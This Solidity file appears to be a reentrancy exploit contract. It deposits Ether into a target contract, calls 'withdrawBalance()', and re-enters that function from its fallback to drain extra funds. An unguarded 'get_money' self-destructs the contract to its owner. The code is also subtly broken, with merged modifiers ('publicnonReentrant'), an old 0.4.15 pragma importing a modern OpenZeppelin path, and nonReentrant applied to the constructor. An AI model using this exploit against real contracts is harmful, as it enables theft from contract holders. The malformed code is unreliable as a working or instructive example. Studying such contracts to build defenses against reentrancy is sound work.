pragma solidity ^0.4.15;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";


contract VaultOperator  is ReentrancyGuard {
    bool public operationActive=false;
    address public target_contract;
    address public owner;

    function VaultOperator() publicnonReentrant {
        owner = msg.sender;
    }

    function deposit(address _target_contract) public payablenonReentrant {
        target_contract = _target_contract ;

        require(target_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
    }

    function launch_handler() publicnonReentrant {
        operationActive = true;


        require(target_contract.call(bytes4(sha3("withdrawBalance()"))));
    }

    function () public payable{

        if (operationActive){
            operationActive = false;
                require(target_contract.call(bytes4(sha3("withdrawBalance()"))));
        }
    }

    function get_money(){
        suicide(owner);
    }

}